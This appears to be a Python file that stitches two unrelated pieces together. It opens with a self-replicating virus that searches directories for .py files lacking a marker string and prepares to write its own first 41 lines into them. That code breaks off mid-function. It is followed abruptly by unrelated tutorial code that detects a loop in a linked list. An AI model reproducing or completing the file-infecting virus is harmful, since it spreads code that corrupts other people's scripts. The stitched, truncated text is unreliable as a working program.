#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to detect loop
# in the linked list

# Node class


class Node:

	# Constructor to initialize
	# the node object
	def __init__(self, data):
		self.data = data
		self.next = None


class LinkedList:

	# Function to initialize head
	def __init__(self):
		self.head = None

	# Function to insert a new
	# node at the beginning
	def push(self, new_data):
		new_node = Node(new_data)
		new_node.next = self.head
		self.head = new_node

	# Utility function to print it
	# the linked LinkedList
	def printList(self):
		temp = self.head
		while(temp):
			print(temp.data, end=" ")
			temp = temp.next

	def detectLoop(self):
		s = set()
		temp = self.head
		while (temp):

			# If we already have
			# this node in hashmap it
			# means there is a cycle
			# (Because we are encountering
			# the node second time).
			if (temp in s):
				return True

			# If we are seeing the node for
			# the first time, insert it in hash
			s.add(temp)

			temp = temp.next

		return False


# Driver program for testing
llist = LinkedList()
llist.push(20)
llist.push(4)
llist.push(15)
llist.push(10)

# Create a loop for testing
llist.head.next.next.next.next = llist.head

if(llist.detectLoop()):
	print("Loop found")
else:
	print("No Loop ")

# This code is contributed by Gitanjali.
# Time Complexity: O(n) Only one traversal of the loop is needed
# Space Complexity: O(n) n is the space required to store the value in hashmap
